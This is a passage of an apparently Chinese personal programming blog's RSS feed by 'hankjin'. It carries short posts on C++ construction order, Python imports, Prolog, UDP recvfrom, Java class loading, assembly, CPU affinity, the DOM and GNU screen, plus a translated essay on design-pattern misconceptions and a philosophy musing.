c;<br>}<br>这个程序的输出就比较复杂：<br>AYAYBXAYAYBAXC~C~A~B~A~A~B~A~A<br>开始分析：<br>先父类后子类，所以先构造B(1)，然后构造C(2)<br>构造B(1)的过程如下:<br>也是先构造A(1.1)，然后构造B(1.2)<br><br>构造A(1.1)的过程如下：<br>调用A的构造函数，输出A(第一个输出字符)<br><br>构造B(1.2)的过程如下：<br>先成员(1.2.1)后构造(1.2.2)，<br>成员(1.2.1)的过程如下：<br>B的成员有Y,A,Y，所以构造Y,A,Y，输出YAY(第二到四个字符)<br>构造(1.2.2)的过程如下：<br>B的构造函数，输出B(第五个字符)<br>所以构造B一共会输出YAYB四个字符<br><br>构造C(2)的过程如下：<br>先成员(2.1)后构造(2.2)<br>成员(2.1)的过程如下：<br>C的成员有XBAX<br>所以构造X，输出X(第六个字符)<br>构造B输出AYAYB(第七到十一个字符)<br>构造A输出A(第十二个字符)<br>构造X输出X(第十三个字符)<br>构造(2.2)<br>输出C(第十四个字符)<br><br>最后按照完全相反的顺序调用析构函数]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201010633157934/</guid>
    </item>
    <item>
      <title>
<![CDATA[相似性 十戒 太极图]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009665455215/</link>
      <description>
<![CDATA[传说中的福柯，据说好比二十世纪的马克思；找来一本福柯的《词与物》，可惜对西方哲学一无所知，读来犹如天书，抱着“好读书而不求甚解，每有所得便悠然自得”的态度看下去，竟然颇有点意思。刚看到相似性理论。<br>相似性是一种普遍存在的规律，甚至表面看来完全不相干的事物也有相似性存在。<br><br>西方哲学建立在“上帝”以及上帝的《圣经》基础上，而东方哲学建立在孔子的毫无根据的伦理道德上。简而言之，两套哲学都是为了解决“什么应该做，什么不应该做”的问题。而所谓济世之道，则是“怎么做”的问题。<br><br>佛家的五戒：不杀生，不偷盗，不饮酒，不妄语，不淫邪<br>基督教的《The Ten Commandments》十戒，<br>1.除了我以外，你不可有别的神。<br>2.不可为自己雕刻偶像，也不可作甚么形像仿佛上天、下地，和地底下、水中的百物。<br>不可跪拜那些像，也不可事奉他，因为我耶和华—你的神是忌邪的神。恨我的，我必追讨他的罪，自父及子，直到三四代；爱我、守我诫命的，我必向他们发慈爱，直到千代。<br>3.不可妄称耶和华—你神的名；因为妄称耶和华名的，耶和华必不以他为无罪。<br>4.当纪念安息日，守为圣日。六日要劳碌作你一切的工，但第七日是向耶和华—你神当守的安息日。这一日你和你的儿女、仆婢、牲畜，并你城里寄居的客旅，无论何工都不可作；因为六日之内，耶和华造天、地、海，和其中的万物，第七日便安息，所以耶和华赐福与安息日，定为圣日。<br>5.当孝敬父母，使你的日子在耶和华—你神所赐你的地上得以长久。<br>6.不可杀人。<br>7.不可奸淫。<br>8.不可偷盗。<br>9.不可作假见证陷害人。<br>10.不可贪恋人的房屋；也不可贪恋人的妻子、仆婢、牛驴，并他一切所有的。 <br><br>昨晚的星空，如太极图，天边一圈白云，南北两半天中间各有一块蓝色无云区，恰有两颗星各位于蓝色无云区的中心，如阴阳鱼。<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009665455215/</guid>
    </item>
    <item>
      <title>
<![CDATA[C++全局指针初始化的区别]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201031465336423/</link>
      <description>
<![CDATA[对一个轨迹球全局指针进行初始化：<br>方法一：<br>ArcBallT myBall(600.0f, 400.0f);<br>ArcBallT *arcBall = &amp;myBall;<br><span style="font-weight: bold;">一切正常</span><br>方法二：<br>ArcBallT *arcBall = new ArcBallT(600.0f, 400.0f);<br><span style="font-weight: bold;">运行正常，结果出错</span><br>为什么呢？<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201031465336423/</guid>
    </item>
    <item>
      <title>
<![CDATA[对于模式的“十大误解”转贴]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720078268112757/</link>
      <description>
<![CDATA[<P><BR>&nbsp;<BR>【译者语】现在“模式”这个词真是非常流行。就象任何流行的东西一样，对它的误解也真是不少。甚至在一些发表出来的文章中，也存在着各种各样的误解， 我想这会对读者造成非常糟糕的引导作用。早已想写一篇文章来澄清一些对模式的误解，却又因为水平所限难以成文。恰在此时， 我看到John Vlissides先生的《十大误解》，于是我便乐得当文抄公了。</P>  <P>??关于设计模式，下面有十种错误的观点??很多都是很流行的观点。且看Vlissides先生如何拨开这些迷雾。</P>  <P>??最近，围绕着模式的讨论日嚣尘上，人们对模式的混淆、惊惶和以讹传讹已经不是一点半点。这也从一个侧面反映出对于主流软件开发者来说，模式是一个多么新鲜的领域??尽管严格说来，它并不是一个新的领域。同时，模式也是一个飞速发展的领域，留下了大片的空白。而且，没错，我们这些模式的支持者也应该受批评，因为我们没有把自己的知识完完全全的教给别人。尽管我们这样想过，但是却没有这样做[BMR+96, Coplien96, CS95, GoF95, MRB98, VCK96]。</P>  <P>??因此，我觉得自己有责任来纠正一些模式方面越来越夸张的误解??我常常听到的那些误解都足以形成自己的模式了。甚至连我也曾经想以模式来组成自己的软件结构……后来我才明白：“把所有的东西都变成模式”，这种想法本身就是错误的！总之，请记住，这篇文章不是在给模式社群的人们看的。我想，绝大多数的模式专家都会同意：下面这些都是很常见的误解。但是他们也许不会同意我消除这些误解的方式。</P>  <P>??这几年以来，我听到过许多人谈论模式。把听到的这些东西整理一下，对模式的误解大概有三类：对于“模式是什么”的误解，对于“模式可以做什么”的误解，以及对于支持模式的人群的误解。我的“十大误解”都落入这三类之中，所以我就把这些误解都组织起来。首先，我们来看看关于“模式是什么”的误解。</P>  <P>??误解之一：“模式是某种场景下某个问题的解决方案”</P>  <P>??这个定义来自于Christopher Alexander[AIS+77]，所以如果把它称为“误解”，也许有人会把我目为异端。但是下面这个简单的反例就能让你看清它的缺点：</P>  <P>??问题：我获奖的奖券就快过期了，我怎样拿到奖金？<BR>??场景：离截止时间只有一小时，可是我家的小狗把奖券给吞了。<BR>??解决方案：把狗开膛破肚，掏出奖券，然后飞奔到最近的兑奖地点。</P>  <P>??这是“某种场景下某个问题的解决方案”，但它不是模式。还缺了什么？至少缺三样东西：</P>  <P>??1. 可重复性。解决方案应该对应于外部的场景。<BR>??2. 可传授性。一个解决方案应该可以移植到问题的不同情况上。（绝大多数模式的可传授性都建立在“约束”和“效果”的基础上。）<BR>??3. 用来表示这个模式的名称。</P>  <P>??确实，很难找到一个令人满意的定义。“模式讨论”邮件列表（<A rel="nofollow" href="mailto:patterns-discussion@cs.uiuc.edu"  >patterns-discussion@cs.uiuc.edu</A>）上正在进行的讨论也证明了这一点。难以定义的一大原因是：模式既是一个事物，也是对类似事物的描述。要区分这两者，有一种办法：“模式”这个术语只用来指代模式的描述，同时用“模式实例”来指代模式的具体应用。</P>  <P>??但是，术语的定义很可能是白费力气，因为一个定义可能对一个人（比如程序员）有意义，但是对另一个人（比如只能看到书面材料的项目主管）却毫无意义。当然，我不打算在这里提出什么最终定义。但是，任何对模式要素的规定，除了必须包括问题、解决方案和场景之外，都必须提及可重复性、可传授性和名称。</P>  <P>??误解之二：“模式就是行话、规则、编程技巧、数据结构……”</P>  <P>??我通常把这些误解统称为“蔑视”。如果你试图把某些不熟悉的东西简化为熟悉的东西，产生这种想法是很自然的，尤其是当你没有特别的兴趣去钻研这些不熟悉的东西时。另外，某些人经常拿新瓶装陈酒，然后大吹“创新”、“革命”一类的口号。保持警惕也是好的。</P>  <P>??但是，这种蔑视通常不是来自亲身体验，而是来自肤浅的认识和一点点冷嘲热讽的。而且，没有什么东西是真正“全新”的。人们的脑海中一直都存在着各种各样的模式，只不过我们现在刚开始为模式命名、将模式记录下来。</P>  <P>??来逐个说明这些看法：的确存在着模式的行话，例如“模式”这个词，例如“约束”，例如Alexander的“无名质量”，等等。但是模式是不能简化为行话的。与其他计算机科学领域相比，模式引入的新术语实在是少得可怜。对于听众来说，好的模式本来就很容易接受。在说明一个模式的时候也许有必要引用问题领域的行话，但是几乎没有必要使用什么特定于模式领域的术语。</P>  <P>??没有哪个模式是能让你不假思索就使用的规则（组件则正好相反），同时模式也不仅仅是“编程技巧”，尽管模式中的“方言（idiom）” 部分是特定于语言的。在我听来，“技巧”这个词带有轻蔑的意思，并且过分强调解决方案，而忽视了问题、场景和名称的重要性。</P>  <P>??毫无疑问，你也曾经听说过一次创新被接受的三个阶段：首先，它被当作垃圾扔在一边；然后，人们会认为它不具可实施性；最后，大家都明白它的意义时，它也没有意义了??“我们一直都这样做”。现在，模式还没有完全走出第一个阶段。</P>  <P>??误解之三：“理解一个，就理解了全部”</P>  <P>??一刀切的规则往往是不公平的，而人们对模式却更加一刀切。模式的领域、内容、范围、形式、质量……这个领域大得吓人，只需要随手翻翻PLoP 的书[CS95, MRB98, VCK96]就能看出。不同的人写出不同的模式，而模式的变化甚至比作者还要多。象Alistair Cockburn、Jim Coplien、Neil Harrison 和Ralph Johnson 这样的作者已经超越了最初大量记录不同领域、不同形式模式的阶段。只看几个例子就对模式做一个笼统的结论，这样的结论必定是错误的。</P>  <P>??误解之四：“模式需要有工具或方法学的支持才会有效”</P>  <P>??在过去的五年中，我记录、使用并且帮助其他人使用模式，还至少帮助完成了一个基于模式的工具[BFV+96]，所以我可以很有把握的说：模式的绝大多数好处都来自于原封不动的使用??也就是说，没有任何形式的外部支持。</P>  <P>??在谈到这个主题的时候，我通常会指出模式带来的四大好处：</P>  <P>??1. 它们记录了专家的经验，并且让非专家也能理解。<BR>??2. 它们的名称构成了一份词汇表，帮助开发者更好的交流。<BR>??3. 它们帮助人们更快的理解一个系统??只要这个系统是用模式的方式描述的。<BR>??4. 它们使系统的重组变得更容易，不管原来的系统是否以模式的方式设计的。</P>  <P>??过去，我一直认为第一项是模式最大的好处。现在我认识到，第二条起码也同样重要。请想一想，在一个开发项目的过程中，有多少字节的信息在开发者之间流动（包括口头的和电子的）？我猜就算没有1G也有好几兆。（在推出了《设计模式》之后，我已经收到了好几十兆给GoF的电子邮件。而且我们所描述的还都是小型到中型的软件开发项目。）由于有如此之大的信息交流量，所以效率上任何微小的提升都能大量节约时间。在这个意义上，模式拓宽了人们交流的带宽。我对第三、四条的评价也在逐渐提高，特别是在项目越来越大、软件生存周期越来越长的今天。</P>  <P>??至少在短期内，模式主要存在于大脑中，而不存在于工具中。如果有了方法学或自动化工具的支持，应该还有其他的收益，但是我相信这些都只是蛋糕上的奶油，而不是蛋糕本身，甚至都不能算蛋糕的一层。</P>  <P>* * *</P>  <P>??到目前为止，我说到的误解都是关于“模式是什么”的。现在来看看关于“模式可以做什么”的误解。这里有两种不同的风格：夸大其词的和心存疑虑的。</P>  <P>??误解之五：“模式可以保证软件的复用性、更高的生产力、世界的和平……”</P>  <P>??道理很简单，模式什么都不保证。它们甚至有可能无法给你带来利益。在创造新事物的过程中，模式无法取代人的位置。它们只是带来一种希望，有可能让一个缺乏经验的、甚至是未入门的，但是有能力、有创造性的人尽快获得设计的能力。</P>  <P>??人们经常说：好的模式会让读者有“啊！”的回应。实际上，只有当模式恰好拨动了读者的某一根心弦时，他们才会有这样的反应。如果没有，模式就只象森林里普通的一棵树。因此，什么是好的模式？不管它写得有多好，如果不能引起读者的共鸣，它又怎能算是好的模式？</P>  <P>??模式只是开发者的工具箱中的另一件工具，对模式寄以过高的期望只会适得其反。准备充分，然后做最坏的打算??这就是防止受骗、消除对抗最好的方法。</P>  <P>??误解之六：“模式可以‘生成’整个软件体系”</P>  <P>??这个误解与上一个有点相似，不过侵略性稍微少些。</P>  <P>??每过一段时间，模式论坛上就会讨论一次模式的生成能力。按照我的理解，“生成能力”是指模式创建最终行为的能力。很多人认为，模式可以帮助读者解决模式本身没有明确提出的问题。我读过的一些书里也有同样的观点。</P>  <P>??对于我来说，“生成能力”的关键是模式的可传授性??约束及其解决，或者对于效果的讨论。在你定义、精炼一个体系结构时，这些观察是特别有用的。但是模式本身并不制造任何东西??任何东西都是由人来制造的。而且，模式不可能覆盖体系结构的每个方面。给我任何一个有实际价值的设计，我都能找出其中模式没有涉及的设计问题。也许这些问题不常见、不具可重复性，或者只是还没有以模式的形式记录下来。不管怎样，你都必须负责填补模式之间的空白??用你自己的创造性。</P>  <P>??误解之七：“模式是针对（面向对象）设计或实现的”</P>  <P>??另一个极端则是过分的限制，就象这个误解。坦白说，任何人都完全可能相信它，我不会有丝毫惊讶。无数的人问过我这个问题，所以它也进入了“十大误解”之列。如果你觉得这种观点实在天真幼稚，跳过这一部分吧。</P>  <P>??如果模式不能记述专家的经验，那它们就什么都不是。对于模式的作者来说，任何形式的专家经验都是可记载的。当然，在面向对象软件设计中有值得记载的经验，但是在非面向对象设计和分析、维护、测试、文档、组织结构……这些方面也同样有值得记载的经验。现在，不同领域中的模式开始浮出水面。至少已经有两本关于分析模式的书[Fowler97, Hay96]，并且每次PLoP大会都会收到新的模式类型。（特别有趣的是1996年的PLoP大会甚至关注了音乐作曲的模式！）</P>  <P>??和大多数的误解一样，这个误解也是有原因的。看看人们用来描述模式的格式，有两种基本的风格：描述高层结构的GoF风格（用于《设计模式》中）；接近文学的Christopher Alexander 风格??叙述性的，尽量少的结构图。由于已经用模式描述了面向对象设计之外的东西，所以我现在认识到GoF风格造成的偏差。对于我研究过的某些领域的专家经验，这种风格根本无法描述。为什么结构图看上去总是让人联想到C++？对于音乐作曲的模式，“实现”应该是什么？“协作”部分真的有意义吗？</P>  <P>??很明显，一种格式不能适应所有的需求。比较具有普遍意义的是模式的概念：模式是记载并传达专家经验的工具??不论是哪个领域的专家经验。</P>  <P>??误解之八：“没有证据表明模式帮助过任何人”</P>  <P>??这种观点曾经有一定的说服力，但是现在已经没有了。在Software-Practice and Experience[Kotula96]这样的杂志上、在OOPSLA[HJE95, Schmid95]和ICSE[BCC+96]这样的会议上，人们不断的报告自己从模式得到的利益。Doug Schmidt已经清楚的说明了在传授计算机科学时使用模式的收益[PD96]。尽管绝大多数的证据都只是定性的，但是据我所知，至少有一个组织得到了一些定量的结论[Prechelt97,PUS97]。</P>  <P>??随着时间推进，我们需要更好的掌握使用模式的好处和缺点。尽管最初的反馈已经让我们看到了希望，但是我们还需要更多的实践经验来做全面的估计。但是，如果仅仅因为模式的好处还没有完全证实就拒绝使用模式，那你就真的是个大傻瓜了。</P>  <P>* * *</P>  <P>??关于“模式能干什么”的谬论还真不少。下面，最后两种误解不是关于模式本身，而是关于支持使用模式的人们的。</P>  <P>??误解之九：“模式社群是精英的小圈子”</P>  <P>??我很想知道这种观念到底是从哪里来的。如果说模式社群的人们有什么引人注目的地方，那就是他们之间巨大的差异。从PLoP大会的与会者名单就能看出??人们来自世界各地，有大公司的也有小公司的，有分析员、设计者和实现者，有学生也有教授，有大名鼎鼎的作者也有初出茅庐的菜鸟。更让我惊讶的是，竟然有不少与会者都不是计算机科学工作者！这个社群仍然在不停变化，每年的与会者名单都与前一年不同。</P>  <P>??如果将模式社群的背景公开出来，别人也许会觉得奇怪：很少有学院派人士。实际上，绝大多数PLoP的与会者都是实践者。软件模式早期的推崇者??包括Kent Beck、Peter Coad 和Ward Cunningham??都没有学院背景。GoF中只有一个人（Ralph）是学院派，而且他也是我所认识的最实际的学院派。很明显，模式社群从根本上反对任何可能的宗派主义和精英论。</P>  <P>??误解之十：“模式社群是自私的，甚至是阴谋家”</P>  <P>??我不止一次的听人指责说：模式最大的用处就是为写模式书籍的人带来了源源不断的收入。他们甚至还暗示模式的发展有着某种邪恶的目的。</P>  <P>??胡说八道！</P>  <P>??作为GoF的一员，我可以肯定的告诉你：对于《设计模式》引起的反响，我们和其他任何人一样吃惊。对于它在OOPSLA 94上的初次亮相引起的暴风骤雨，我们也同样没有准备??甚至出版商都没有预料到会有这么大的销量。在整个写作过程中，我们最关心的就是尽量写出一本高质量的书，至于销售上的问题，我们根本没有时间去想。现在“模式”已经成了一个时髦的词汇，不可避免的会有一些人将这个词用来谋取私利。但是，如果你认真读过顶尖的模式作者的作品，你就会感觉到他们共同的目标：将难以获取的经验、最佳的实践、甚至是竞争中的优势??多年实践经验的累积??分享给读者，而且讲解得一清二楚。正是这种帮助读者的热情激励着每一个真诚而踏实的模式作者。如果没有这种热情，作者就会弄巧成拙??这种不负责任的作者往往正是对模式所有误解的根源 <BR></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720078268112757/</guid>
    </item>
    <item>
      <title>
<![CDATA[import名字奇怪的python文件]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720121274648251/</link>
      <description>
<![CDATA[abc.py 直接 import abc就行了<br>ab-c.py 就要用__import__('ab-c')<br>ab-c 就要用 abc=imp.load_source('abc','.', 'ab-c')<br>汗]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720121274648251/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubungu下编写Prolog]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010111311282896/</link>
      <description>
<![CDATA[Prolog是一种逻辑编程语言。<br>安装编程环境<br><wbr>$ sudo apt-get install swi-prolog<br>进入交互环境<br>$ prolog<br>?- a is 3+4.<br>false.<br>?- A is 3+4.<br>A = 7.<br><b>编写规则</b><br>$ cat &gt; love.pl&lt;&lt;EOF<br>#!/usr/bin/prolog -s<br>love(a,b).<br>love(b,c).<br>love(c,d).<br>love(d,a).<br>love(b,a).<br>lovers(X,Y):-love(X,Y),love(Y,X).<br>EOF<br><b>编译运行</b><br>$ prolog -o love -c love.pl<br>% love.pl compiled 0.00 sec, 2,648 bytes<br>$ ./love<br>
?- love(X,a).<br>
X = d ;<br>
X = b<br>
?- love(a,X).<br>
X = b<br>
?- lovers(a,b).<br>
Yes<br>
?- lovers(a,X).<br>
X = b<br><b>脚本运行</b><br>$ chmod +x love.pl<br>$ ./love.pl<br>?- love(X,a).<br>X = d;<br>X = b<br>...]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010111311282896/</guid>
    </item>
    <item>
      <title>
<![CDATA[从另一个线程将recvfrom从阻塞状态唤醒]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201155103633967/</link>
      <description>
<![CDATA[UDP的多线程程序，一般开一个线程循环调用recvfrom接收消息，当程序中止的时候，如果这个线程阻塞在recvfrom调用，并且没有消息到达，则这个线程无法终止，造成资源泄露等问题。<br>这里终止这个线程有六种方法：<br>1. 释放监听的fd，这个是最简单的方法，但是有一点要注意，就是close(fd)系统调用无效，必须要使用<b>shutdown(fd, SHUT_RDWR)</b>来将recvfrom唤醒，因为close只关闭写通道，recvfrom在fd的写通道等待列表中，只要关闭写通道时才会将recvfrom阻塞唤醒。<br><br>2. 在调用recvfrom前将recvfrom的fd设置一个超时，这个超时时间较难设置，但比较简单，也容易实现<br>3. 在调用recvfrom前将recvfrom的fd设置为非阻塞的，这个方法容易导致循环过快，CPU使用率上升<br>4. 使用select/epoll来接收，<br>5. fake一个消息包发给这个相应的端口<br>6. pthread_cancel强制杀掉线程]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201155103633967/</guid>
    </item>
    <item>
      <title>
<![CDATA[ClassLoader Class.forName动态载入类]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200689754390/</link>
      <description>
<![CDATA[天气:<IMG src="http://img.blog.163.com/photo/bOzunJnM668KHCP8wFpfGQ==/4278982595955566812.gif">心情:<IMG src="http://img.blog.163.com/photo/qmcxKxMQX+esO4QSENBHeQ==/5131851775388843392.gif"><BR>
<P><SPAN>1。Main</SPAN></P>
<P><SPAN>class Office <BR>{<BR>&nbsp;public static void main(String[] args) throws Exception<BR>&nbsp;{<BR>&nbsp;&nbsp;String word = "Word";<BR>&nbsp;&nbsp;String xls = "Excel";<BR>&nbsp;&nbsp;Object o = Class.forName(word).newInstance();<BR>&nbsp;&nbsp;Office_I of = (Office_I)o;<BR>&nbsp;&nbsp;of.work();<BR>&nbsp;}<BR>}<BR></SPAN></P>
<P><SPAN>2。Interface</SPAN></P>
<P><SPAN>public interface Office_I<BR>{<BR>&nbsp;public void work();<BR>}</SPAN></P>
<P><SPAN>3。Implement</SPAN></P>
<P><SPAN>public class Excel implements Office_I<BR>{<BR>&nbsp;public void work()<BR>&nbsp;{<BR>&nbsp;&nbsp;System.out.println("Exce works");<BR>&nbsp;}<BR>}</SPAN></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200689754390/</guid>
    </item>
    <item>
      <title>
<![CDATA[.type xxx,@function]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720100871030788/</link>
      <description>
<![CDATA[AT汇编中的函数定义，经常出现这么一句<br>.type areafunc,@function<br>删掉以后一切正常，只有一种情况下会出错，就是在用动态连接库的时候，如果没有第二行的这句话，就会出错<br>as&nbsp;&nbsp; -o areafunc.o areafunc.s<br>gcc -shared -o libhjz.so areafunc.o -Wl<br>gcc -o sotest&nbsp; -L. -lhjz floatest.c<br>/usr/bin/ld: warning: type and size of dynamic symbol `areafunc' are not defined<br>/usr/bin/ld: dynamic variable `areafunc' is zero size<br>/usr/bin/ld: /tmp/ccIBDF3a.o(.text+0x1f): unresolvable R_386_PC32 relocation against symbol `areafunc'<br>/usr/bin/ld: final link failed: Nonrepresentable section on output<br>collect2: ld returned 1 exit status<br>make: *** [sotest] Error 1<br><br>#areafunc.s<br>.section .text<br>
#.type areafunc,@function<br>
.global areafunc<br>
areafunc:<br>
pushl %ebp<br>
movl %esp,%ebp<br>
<br>
fldpi<br>
filds 8(%ebp)<br>
fmul %st(0),%st(0)<br>
fmul %st(1),%st(0)<br>
<br>
movl %ebp,%esp<br>
popl %ebp<br>
ret<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720100871030788/</guid>
    </item>
    <item>
      <title>
<![CDATA[CPU亲和力affinity]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720107191428377/</link>
      <description>
<![CDATA[通过sched_setaffinity函数，可以设置CPU的亲和力，让指定的进程运行于指定的CPU上。<br>cc smp.c -o smp<br>./smp &gt; smp.log<br><br>查看效果的方法：<br>运行top，然后按1，即可看到：（当然，你的CPU必须是多核的）<br>top - 13:03:30 up 3 days,&nbsp; 3:03,&nbsp; 3 users,&nbsp; load average: 0.88, 0.28, 0.16<br>Tasks: 123 total,&nbsp;&nbsp; 3 running, 120 sleeping,&nbsp;&nbsp; 0 stopped,&nbsp;&nbsp; 0 zombie<br><b>Cpu0&nbsp;</b> :&nbsp; <b>0.0%us</b>,&nbsp; 3.5%sy,&nbsp; 0.0%ni, 24.9%id, 71.1%wa,&nbsp; 0.0%hi,&nbsp; 0.5%si,&nbsp; 0.0%st<br><b>Cpu1</b>&nbsp; : <b>25.1%us</b>, 19.6%sy,&nbsp; 0.0%ni,&nbsp; 0.0%id, 62.8%wa,&nbsp; 0.0%hi,&nbsp; 0.0%si,&nbsp; 0.0%st<br>Mem:&nbsp;&nbsp; 1023980k total,&nbsp; 1008392k used,&nbsp;&nbsp;&nbsp; 15588k free,&nbsp;&nbsp;&nbsp; 56520k buffers<br>Swap:&nbsp;&nbsp; 979956k total,&nbsp;&nbsp;&nbsp;&nbsp; 5172k used,&nbsp;&nbsp; 974784k free,&nbsp;&nbsp; 808188k cached<br><br><br><b>代码smp.c</b><br>#define _GNU_SOURCE<br>#include &lt;sched.h&gt;<br>#include &lt;stdio.h&gt;<br><br>int main(){<br>&nbsp;&nbsp;&nbsp; cpu_set_t mask;<br>&nbsp;&nbsp;&nbsp; CPU_ZERO(&amp;mask);<br>&nbsp;&nbsp;&nbsp; CPU_SET(<b>1</b>,&amp;mask);//在CPU <b>1</b> 上运行<br>&nbsp;&nbsp;&nbsp; if(sched_setaffinity(0, sizeof(cpu_set_t), &amp;mask)==-1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Error happend");<br>&nbsp;&nbsp;&nbsp; while(1){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Running on CPU 1\n");<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return 0;<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720107191428377/</guid>
    </item>
    <item>
      <title>
<![CDATA[W3C DOM学习]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200832565948788/</link>
      <description>
<![CDATA[TRAN,NAM1,VA1,N2,v2,PRB<br>1.DOM概念集及关系<br>2.使用Firebug学W3C Document<br><br>1.DOM概念集及关系<br>Document, Node, NodeList, NamedNodeMap<br>1.1 Document<br>documentElement, createElement(), createTextNode(), createAttribute(), getElementsByTabName()<br>1.2 Node<br>attributes&lt;NamedNodeMap&gt;, parentNode&lt;Node&gt;, childNodes&lt;NodeList&gt;, firstChild, lastChild, previousSibling, nextSibling, nodeName, nodeType, hasChildNodes(), appendChild(), cloneNode() insertBefore(), removeChild(), replaceChild()<br>1.3 NodeList<br>length, item(index), []<br>1.4 NamedNodeMap<br>getNamedItem, removeNamedItem, setNamedItem<br>1.5 MSXML<br>load(), loadXML(), readystate, onreadystatechange()<br>documentMethods: xml nextNode() selectNodes(), selectSingleNode(), transformNode(), transformNodeToObject()<br>var doc = new ActiveXObject("Microsfot.XMLDOM");<br>1.6 Mozilla<br>var doc = document.implementation.createDocument("","",null);<br><br><br>2.使用Firebug学W3C Document<br>2.1. 按F12打开Firebug，然后选左面的Console标签，然后就可以在右面的窗口输入命令并执行了。<br>2.2. 输入document.documentElement.appendChild(document.createElement("Hello"));按Ctrl+Enter执行。<br>2.3. 输入alert(document.documentElement.lastChild.nodeName);按Ctrl+Enter执行，弹出对话框Hello，成功<br><br>可运行的脚本<br>//添加一个子节点<br>document.documentElement.appendChild(document.createElement("hello"));<br>//移除一个子节点<br>document.documentElement.removeChild(document.documentElement.lastChild);<br>//替换一个子节点<br>document.documentElement.replaceChild(<br>&nbsp;&nbsp;&nbsp; document.createElement("hank"),<br>&nbsp;&nbsp;&nbsp; document.documentElement.lastChild);<br>//显示一个子节点的节点名<br>alert(document.documentElement.lastChild.nodeName);<br>//length<br>alert(document.documentElement.childNodes.length);<br>//item<br>alert(document.documentElement.childNodes.item(0).nodeName);<br>alert(document.documentElement.childNodes[1].nodeName);<br>//set attribute<br>var att = document.createAttribute("hello");<br>att.value="world";<br>document.documentElement.lastChild.attributes.setNamedItem(att);<br>alert(document.documentElement.lastChild.attributes.length);<br>alert(document.documentElement.lastChild.attributes[0].nodeValue);<br>//get attribute.<br>alert(document.documentElement.lastChild.attributes.getNamedItem("hello").nodeValue);<br><br>//MSXML<br>document.load("dvd.xml");<br>document.loadXML('&lt;?xml version="1.0"?&gt;&lt;library/&gt;');<br>//Mozia xml<br>var oDOM = new DOMParser().parseFromString('&lt;?xml version="1.0"?&gt;&lt;lib/&gt;',"text/xml");<br>document.write(oDOM.childNodes[0].nodeName);]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200832565948788/</guid>
    </item>
    <item>
      <title>
<![CDATA[screen]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200981310227771/</link>
      <description>
<![CDATA[创建Screen<br>screen<br>screen &lt;cmd&gt;<br>断开Screen<br>Ctrl-a d<br>恢复Screen<br>screen -r<br>screen -x<br>退出Screen<br>exit<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200981310227771/</guid>
    </item>
    <item>
      <title>
<![CDATA[[Fw]1个用户变成100万的9种办法]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720099179841627/</link>
      <description>
<![CDATA[是digg创始人(也是WeFollow and Revision3，pownce的创始人)Kevin Rose在The Future
of Web Apps London (FOWA)的演说，Kevin
